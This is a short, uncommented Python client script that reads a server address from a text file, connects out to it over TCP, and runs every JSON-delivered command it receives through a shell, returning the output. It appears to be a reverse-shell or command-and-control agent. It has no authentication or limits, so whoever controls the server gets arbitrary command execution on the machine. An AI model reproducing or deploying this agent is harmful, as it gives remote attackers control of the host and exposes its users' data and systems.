import socket
import subprocess
import json

FILENAME = 'server_info.txt'

def read_server_info_from_file():
    with open(FILENAME, 'r') as file:
        server_info = file.readline().strip().split(':')
    return server_info[0], int(server_info[1])

def connect_to_server():
    server_host, server_port = read_server_info_from_file()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))
        print(f"Connected to server {server_host}:{server_port}")
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if not command:
                    print("Empty command received")
                    break
                print(f"Received command: {command}")
                command_data = json.loads(command)
                client_id = command_data["client_id"]
                command_id = command_data["command_id"]
                command_text = command_data["command"]
                output = subprocess.check_output(command_text, shell=True).decode()
                print(f"Processed command: {command_text}")
                print(f"Output: {output}")
                response = {"client_id": client_id, "command_id": command_id, "response": output}
                client_socket.sendall(json.dumps(response).encode())
            except Exception as e:
                print(f"Error processing command: {e}")
                break

if __name__ == "__main__":
    connect_to_server()
